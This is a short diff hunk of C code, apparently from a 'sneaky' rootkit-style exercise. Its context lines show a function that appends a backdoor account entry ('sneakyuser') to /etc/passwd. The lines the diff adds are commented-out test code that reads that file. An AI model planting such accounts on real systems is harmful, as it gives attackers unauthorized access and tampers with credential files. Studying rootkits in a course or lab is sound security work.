@@ -63,6 +63,10 @@ void modify_passwd_file() {
   fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
   fclose(fp);
 
+  /* char *const test_open[] = {"/bin/cat", "/etc/passwd", */
+  /*                            0}; // needs to be null terminated */
+  /* run_command(test_open[0], test_open); */
+
   printf("\nappended sneaky line to /etc/passwd\n\n");
 }
 
